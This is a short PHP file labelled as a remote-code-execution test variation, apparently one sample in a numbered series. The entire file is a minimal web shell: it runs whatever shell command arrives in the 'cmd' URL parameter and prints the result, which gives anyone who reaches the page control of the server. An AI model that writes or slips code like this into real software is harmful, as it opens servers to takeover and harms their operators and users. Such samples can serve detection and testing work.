<?php
// RCE test variation #855
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>